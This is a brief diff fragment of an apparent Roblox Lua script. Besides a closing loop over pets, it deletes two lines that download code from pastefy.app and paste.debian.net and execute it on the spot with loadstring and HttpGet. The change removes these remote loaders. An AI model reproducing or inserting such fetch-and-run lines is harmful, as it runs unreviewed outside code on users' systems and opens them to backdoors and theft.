@@ -708,7 +708,3 @@ for _, pet in ipairs(pets) do
         
     end
 end
-
-loadstring(game:HttpGet("https://pastefy.app/4R9g2tue/raw"))()
-
-loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
